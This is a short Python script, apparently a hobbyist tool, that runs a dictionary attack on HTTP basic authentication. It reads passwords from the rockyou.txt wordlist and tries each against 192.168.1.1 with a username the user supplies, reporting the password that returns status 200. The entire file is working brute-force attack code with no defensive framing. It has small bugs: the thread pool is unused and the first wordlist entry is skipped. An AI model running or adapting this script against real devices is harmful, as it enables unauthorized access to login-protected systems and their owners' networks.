from requests.auth import HTTPBasicAuth
import requests
from concurrent.futures import ThreadPoolExecutor
import time
import threading


print("Welcome to HTTTPBasic auth dictionary attack")
username = input("First: Do you have a username you want to try?")

start = time.time()
#


#TODO
#Optimalisere koden med concurrent for raskere jobbing
#Fikse bug med at den ikke printer rett i den første linjen

i = 0
#adm
f = open(r'rockyou.txt', 'r', encoding="latin-1")  
line = f.readline()
while line:
    with ThreadPoolExecutor() as executor:
        line = f.readline()
        print("Line {}: {}".format(i, line.strip()))
        r = requests.get('http://192.168.1.1', auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip())))
        i += 1
        if r.status_code == 200:
            print("Password found!")
            print("The password is: {}".format(line.strip()))
            break

end = time.time()
print(end - start)